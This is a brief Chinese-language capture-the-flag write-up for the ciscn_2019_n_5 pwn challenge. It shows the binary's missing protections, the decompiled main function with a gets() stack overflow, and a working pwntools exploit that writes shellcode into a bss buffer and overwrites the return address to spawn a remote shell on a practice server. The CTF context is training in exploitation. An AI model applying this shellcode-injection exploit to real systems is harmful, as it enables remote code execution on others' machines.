# ciscn_2019_n_5

## 保护

```shell
$ checksec --file=2019
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

什么防护都没有，可以直接怼shellcode



## main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char text[30]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  puts("tell me your name");
  read(0, name, 0x64uLL);
  puts("wow~ nice name!");
  puts("What do you want to say to me?");
  gets(text);
  return 0;
}
```

name处于bss段，text可以栈溢出



## EXP

第一次输入把shellcode写入name中，第二次输入栈溢出覆盖返回地址，利用栈迁移回到shellcode执行

```python
from pwn import*
#r=process('./2019')
r=remote('node4.buuoj.cn',25899)

context(arch='amd64',os='linux')
shellcode=asm(shellcraft.sh())
r.sendlineafter('tell me your name',shellcode)

payload=b'a'*0x28+p64(0x601080)
r.sendlineafter('What do you want to say to me?',payload)

r.interactive()
```

